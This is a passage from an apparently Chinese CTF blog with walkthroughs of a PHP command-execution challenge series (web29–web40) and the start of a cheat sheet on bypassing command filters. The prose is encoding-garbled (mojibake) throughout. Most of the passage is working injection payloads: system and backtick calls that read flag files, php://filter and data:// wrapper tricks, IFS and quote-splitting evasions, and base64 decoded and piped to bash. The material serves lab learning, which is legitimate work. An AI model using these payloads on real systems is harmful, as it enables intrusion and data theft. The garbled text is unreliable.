class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br>  <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><br></code></pre></td></tr></table></figure><p>preg_matchå‡½æ•°æ˜¯è¿›è¡Œ<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168190228216800192231163%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168190228216800192231163&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev85%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">æ­£åˆ™è¡¨è¾¾å¼</a>çš„åŒ¹é…ï¼ŒæˆåŠŸè¿”å›1ï¼Œå¦åˆ™è¿”å›0ã€‚<br>åœ¨è¿™ä¸ªæ­£åˆ™é‡Œè¾¹æœ‰ä¸€ä¸ªå‚æ•°æ˜¯iï¼Œè¿™ä¸ªåœ¨æ­£åˆ™è¡¨è¾¾å¼é‡Œè¾¹æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ä¸€ä¸ªå‚æ•°</p><p>æŸ¥çœ‹ç›®å½•</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>è·å–flag.php ï¼Œå…³é”®å­—flagè¿‡æ»¤ï¼Œä½¿ç”¨é€šé…ç¬¦ï¼Ÿ</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>ctrl+uæŸ¥çœ‹æºç </p><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>cpå‘½ä»¤å°†flag.phpä¿å­˜åˆ°1.txt å†å»è®¿é—®1.txt</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ¥ç€åœ¨urlåè¾“å…¥1.txtå°±å¯ä»¥çœ‹åˆ°flagäº†</p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å­˜æºä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™æ¬¡è¿‡æ»¤äº†flagï¼Œsystemï¼Œphp<br>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨â€™â€™æ¥ä»£æ›¿system()ï¼Œè¿™é‡Œçš„&#96;æ˜¯tabä¸Šé¢çš„åæ–œå·</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=`cp fla?.p?? <span class="hljs-number">1</span>.txt`;<br></code></pre></td></tr></table></figure><p>åœ¨urlåè¾“å…¥1.txtæŸ¥çœ‹è·å¾—flag</p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>ä»æºä»£ç å¯ä»¥çœ‹å‡ºï¼Œè¿™é¢˜è¿˜è¿‡æ»¤äº†catå’Œç©ºæ ¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨eval( )æ¥æ“ä½œï¼Œ è¿™ä¸ª1å·²ç»ä¸å±äºcçš„å†…å®¹äº†ï¼Œæ‰€ä»¥ä¸å—è¿‡æ»¤ç®¡æ§äº†ï¼Œ</p><p>å¾—åˆ°ç©ºç™½é¡µé¢å³å‡»çœ‹æºç æ‰èƒ½å¾—åˆ°flag</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p> å°†cat æ¢æˆ tac å°±å¯ä»¥ç›´æ¥çœ‹åˆ°flag,(tac æ˜¯ cat çš„åå‘æ˜¾ç¤º),catä¹Ÿå¯ä»¥ç›´æ¥çœ‹åˆ°</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®æºä»£ç å¯çŸ¥ï¼Œåå¼•å·ï¼Œåˆ†å·ï¼Œæ‹¬å·éƒ½ä¸èƒ½ç”¨<br>æ²¡æœ‰æ‹¬å·å°±ä¸èƒ½ä½¿ç”¨ä¸Šä¸€é¢˜çš„eval(),æ‰€ä»¥è¦ç”¨æ²¡æœ‰æ‹¬å·çš„å‡½æ•°ï¼Œæ¯”å¦‚include<br>åˆ†å·å¯ä»¥ç”¨ï¼Ÿ&gt;ä»£æ›¿<br>è¿˜éœ€è¦é…åˆä½¿ç”¨<strong>ä¼ªåè®®</strong>ï¼Œé€šè¿‡ç‰¹å®šçš„é€šé“è¯»å–æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªbase64çš„æ•°æ®<img src="/images/666.png" alt="base64"></p><p><a href="https://c.runoob.com/front-end/693/">base64è§£ç </a></p><p>è·å¾—flagï¼</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†ä¸€ä¸ªâ€<br>ä½¿ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•ä¸€æ ·å¯ä»¥åšå‡ºæ¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„base64åŠ å¯†ï¼Œè§£ç è·å¾—flag</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†ä¸€ä¸ªå†’å·ï¼Œä¹Ÿä¸å½±å“æˆ‘ä»¬ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>ä»£ç æ‡’å¾—å¸–äº†<br>ps:æ­¤å¤„å¤šè¿‡æ»¤äº†&lt;&#x3D;ï¼Œä¸ä¸Šé¢˜é¢˜è§£ä¸€æ ·</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>ä»£ç æ‡’å¾—è´´äº†ï¼Œå’Œå‰å‡ é¢˜ç±»ä¼¼<br>ps:æ­¤å¤„è¿‡æ»¤äº†æ•°å­—</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡data:&#x2F;&#x2F;text&#x2F;plainåè®®æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>ctrl+uä»¥è·å¾—flag!</p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯”ä¸Šä¸€é¢˜å¤šè¿‡æ»¤äº†phpï¼Œfile<br>ä½¿ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•å°±è¡Œï¼Œéœ€è¦æŠŠphpæ¢æˆ&#x3D; å³<?=å†…å®¹?></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span> system(<span class="hljs-string">&quot;cat fla?.ph?&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åŠ äº†ä¸ªåç¼€.phpï¼Œä½†è¿˜æ˜¯ä¸å½±å“ç”¨dataåè®®</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/?c=data://text/plains,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>åªæ˜¯åé¢å¤šäº†ä¸ª.php<br><img src="/images/678.png"></p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>åœ¨urlä¸­è¾“å…¥</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/?c=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag<br>emmm~å¹¶ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆåŸç†ï¼Œåç»­è·Ÿè¿›ğŸ¥¹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œç»•è¿‡å°æŠ€å·§</title>
    <link href="/2023/04/19/minlinzhixinraoguo/"/>
    <url>/2023/04/19/minlinzhixinraoguo/</url>
    
    <content type="html"><![CDATA[<h2 id="ç®¡é“ç¬¦"><a href="#ç®¡é“ç¬¦" class="headerlink" title="ç®¡é“ç¬¦"></a>ç®¡é“ç¬¦</h2><h4 id="windows-ä¸‹ï¼š"><a href="#windows-ä¸‹ï¼š" class="headerlink" title="windows ä¸‹ï¼š"></a>windows ä¸‹ï¼š</h4><blockquote><ul><li><strong>|</strong> ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</li><li><strong>||</strong> å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</li><li><strong>&amp;</strong> å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</li><li><strong>&amp;&amp;</strong> å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</li></ul></blockquote><h4 id="Linux-ä¸‹ï¼š"><a href="#Linux-ä¸‹ï¼š" class="headerlink" title="Linux ä¸‹ï¼š"></a>Linux ä¸‹ï¼š</h4><blockquote><ul><li><strong>;</strong> å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</li><li><strong>|</strong> ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</li><li><strong>||</strong> å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</li><li><strong>&amp;</strong> å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</li><li><strong>&amp;&amp;</strong> å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</li></ul></blockquote><h2 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h2><ul><li><strong>&gt;</strong> &lt; &lt;&gt; é‡å®šå‘ç¬¦</li><li>%09(éœ€è¦phpç¯å¢ƒ)</li><li>${IFS}</li><li>$IFS$9</li><li>{cat,flag.php} &#x2F;&#x2F;ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</li><li>%20</li><li>%09</li></ul><h2 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h2><blockquote><ul><li>system()</li><li>passthru()</li><li>exec()</li><li>shell_exec()</li><li>popen()</li><li>proc_open()</li><li>pcntl_exec()</li><li>åå¼•å· åŒshell_exec()</li></ul></blockquote><h2 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h2><h4 id="æ‹¼æ¥"><a href="#æ‹¼æ¥" class="headerlink" title="æ‹¼æ¥"></a>æ‹¼æ¥</h4><blockquote><p>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p></blockquote><h4 id="base64ç¼–ç "><a href="#base64ç¼–ç " class="headerlink" title="base64ç¼–ç "></a>base64ç¼–ç </h4><blockquote><p>echo â€œY2F0IGZsYWc&#x3D;â€|base64 -d<br>echo â€œY2F0IGZsYWc&#x3D;â€|base64 -d|bash (åœ¨bashè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹å¯å°è¯•sh)</p></blockquote><h4 id="å•å¼•å·ã€åŒå¼•å·"><a href="#å•å¼•å·ã€åŒå¼•å·" class="headerlink" title="å•å¼•å·ã€åŒå¼•å·"></a>å•å¼•å·ã€åŒå¼•å·</h4><blockquote><p>câ€â€at flâ€™â€™ag</p></blockquote><h4 id="åæ–œçº¿"><a href="#åæ–œçº¿" class="headerlink" title="åæ–œçº¿"></a>åæ–œçº¿</h4><blockquote><p>c\at fl\ag</p></blockquote><h4 id="æ­£åˆ™-å‡è®¾-x2F-bin-x2F-cat-test-æ˜¯ä¸€ä¸ªç›®å½•"><a href="#æ­£åˆ™-å‡è®¾-x2F-bin-x2F-cat-test-æ˜¯ä¸€ä¸ªç›®å½•" class="headerlink" title="æ­£åˆ™ (å‡è®¾&#x2F;bin&#x2F;cat: test: æ˜¯ä¸€ä¸ªç›®å½•)"></a>æ­£åˆ™ (å‡è®¾&#x2F;bin&#x2F;cat: test: æ˜¯ä¸€ä¸ªç›®å½•)</h4><blockquote><p>&#x2F;???&#x2F;?[a][t] ?â€™â€™?â€™â€™?â€™â€™?â€™â€™<br>&#x2F;???&#x2F;?at ????<br>&#x2F;???&#x2F;?[a]â€™â€™[t] ?â€™â€™?â€™â€™?â€™â€™?â€™â€™</p></blockquote><h4 id="1ã€-2ç­‰å’Œ"><a href="#1ã€-2ç­‰å’Œ" class="headerlink" title="$1ã€$2ç­‰å’Œ$@"></a>$1ã€$2ç­‰å’Œ$@</h4><blockquote><ul><li>$# æ˜¯ä¼ ç»™è„šæœ¬çš„å‚æ•°ä¸ªæ•°</li><li>$0 æ˜¯è„šæœ¬æœ¬èº«çš„åå­—</li><li>$1 æ˜¯ä¼ 